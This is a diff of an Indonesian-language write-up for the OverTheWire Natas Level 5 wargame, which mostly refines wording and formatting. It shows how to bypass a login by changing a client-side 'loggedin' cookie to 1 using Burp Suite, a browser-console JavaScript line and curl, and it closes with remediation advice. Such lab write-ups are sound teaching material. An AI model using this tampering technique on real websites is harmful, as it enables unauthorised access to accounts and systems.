@@ -7,36 +7,38 @@ sidebarTitle: "Level 5 — Manipulasi Cookie"
 ## Profil
 
 - **Target:** `http://natas5.natas.labs.overthewire.org`
-- **Kredensial:** `natas5` / (password dari Level 4)
+- **Kredensial:** `natas5` / (*password* dari Level 4)
 
 ## Pengintaian
 
-Halaman menampilkan "Access disallowed. You are not logged in." Pemeriksaan header respons mengungkapkan arahan `Set-Cookie`:
+Laman menampilkan "Access disallowed. You are not logged in." Pemeriksaan terhadap header respons mengungkapkan adanya arahan `Set-Cookie`:
 
 ```http
 Set-Cookie: loggedin=0
 ```
 
+Aplikasi menggunakan *cookie* untuk melacak status autentikasi pengguna.
+
 ## Analisis
 
-Cookie `loggedin` adalah flag boolean yang disimpan di sisi klien. Server mempercayai cookie ini untuk menentukan apakah pengguna telah diautentikasi. Ini adalah contoh klasik dari **manajemen status autentikasi yang tidak aman**.
+*Cookie* `loggedin` merupakan *flag* boolean yang disimpan di sisi klien. Server sepenuhnya memercayai *cookie* ini untuk menentukan status autentikasi pengguna. Ini adalah contoh klasik dari **manajemen status autentikasi yang tidak aman** (*insecure authentication state management*) — keputusan autentikasi didelegasikan kepada klien dan dapat dimodifikasi dengan mudah.
 
 ## Eksploitasi
 
-Menggunakan Burp Suite, intercept permintaan dan ubah nilai cookie sebelum meneruskan:
+Dengan Burp Suite, *intercept* permintaan dan ubah nilai *cookie* sebelum diteruskan:
 
 ```http
 Cookie: loggedin=1
 ```
 
-Juga dapat dilakukan di browser melalui console developer tools:
+Hal ini juga dapat dilakukan melalui konsol perangkat pengembang di *browser*:
 
 ```javascript
 document.cookie = "loggedin=1";
 location.reload();
 ```
 
-Atau dengan `curl`:
+Atau menggunakan `curl`:
 
 ```bash
 curl -u natas5:$(cat password5) \
@@ -46,10 +48,10 @@ curl -u natas5:$(cat password5) \
 
 ## Hasil
 
-Server menerima cookie yang dimodifikasi sebagai autentik dan mengembalikan password untuk Level 6.
+Server memperlakukan *cookie* yang telah dimodifikasi sebagai autentik dan mengembalikan *password* untuk Level 6.
 
 ## Remediasi
 
-- Jangan pernah menyimpan status autentikasi di cookie yang dapat dimodifikasi klien
+- Jangan sekali-kali menyimpan status autentikasi dalam *cookie* yang dapat dimodifikasi oleh klien
 - Gunakan sesi sisi server dengan identifier sesi yang ditandatangani secara kriptografis
-- Validasi semua data sesi di sisi server
+- Validasi seluruh data sesi di sisi server
